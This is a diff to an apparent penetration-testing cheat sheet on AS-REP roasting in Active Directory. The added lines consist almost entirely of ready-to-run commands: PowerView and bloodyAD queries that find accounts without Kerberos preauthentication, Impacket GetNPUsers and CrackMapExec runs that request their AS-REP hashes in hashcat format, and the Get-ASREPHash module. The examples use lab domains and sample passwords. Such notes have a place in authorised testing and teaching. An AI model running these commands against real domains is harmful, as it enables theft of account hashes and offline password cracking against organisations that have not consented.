@@ -14,9 +14,29 @@
 
 #### 2) python3 Impacket-GetNPUsers.py -dc-ip DC_IP DOMAIN/USER -outputfile /tmp/list.txt
 
+# Enumeration (Need domain credentials)
+
+## Windows
+
+ - Get-DomainUser -PreauthNotRequired -verbose (Powerview)
+
+## Linux 
+
+ - bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
+
+## Method: Impacket GetNPUsers
+
+ - python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast (Try all the usernames in usernames.txt)
+
+ - python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast (Use domain creds to extract targets and target them)
+
 ## Alternate Method: CrackMapExec
 
  -  crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asrep
+
+## Alternate Method: ASREPRoast powershell module https://github.com/HarmJ0y/ASREPRoast
+
+ - Get-ASREPHash -Username VPN114user -verbose
 
 ### More tools:
 
